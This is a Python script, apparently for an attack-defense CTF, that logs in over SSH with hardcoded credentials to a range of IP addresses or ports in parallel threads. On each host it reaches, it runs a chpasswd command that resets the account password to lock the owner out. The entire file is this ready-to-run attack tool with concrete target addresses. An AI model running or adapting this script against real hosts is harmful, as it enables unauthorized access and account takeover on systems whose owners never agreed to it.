#-*-coding:utf-8-*-
# Code by lego

import paramiko
from threading import Thread


def autossh(ip,port):
	ssh = paramiko.SSHClient() 
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 允许连接不在know_hosts文件中的主机
	try:
		ssh.connect(ip,port,"ctf","aa2927")    #第三个参数为账号 第四个为密码
		#execmd = 'id' #测试id命令是否执行
		print(str(ip)+":"+str(port)+"-->connect success!\n")
		execmd='echo ctf:leg0she22|chpasswd'      #这个是批量修改密码为leg0she22的
		stdin, stdout, stderr = ssh.exec_command (execmd) 
		print(stdout.read())  
		ssh.close()
	except Exception as e:
		print(str(ip)+":"+str(port)+"-->connect error!\n")

def attips():
	port = 2201 # 指定端口
	ips="129.204.89."
	minip=20	#起始ip地址
	maxip=25	#末位ip地址
	for i in range(minip,maxip+1):
		ip = ips+str(i)
		try:
			t=Thread(target=autossh,args=(ip,port))
			threads.append(t)
		except Exception as e:
			pass
	for num in range(maxip-minip+1):
		threads[num].start()
	for num in range(maxip-minip+1):
		threads[num].join()

def attports():
	ip="129.204.89.21" # 指定ip
	minport=2200	#起始端口
	maxport=2220	#末位端口
	for port in range(minport,maxport+1):
		try:
			#autossh(ip,port)
			t=Thread(target=autossh,args=(ip,port))
			threads.append(t)
		except Exception as e:
			pass
	for num in range(maxport-minport+1):
		threads[num].start()
	for num in range(maxport-minport+1):
		threads[num].join()

if __name__ == "__main__":
	threads = []
	attips()
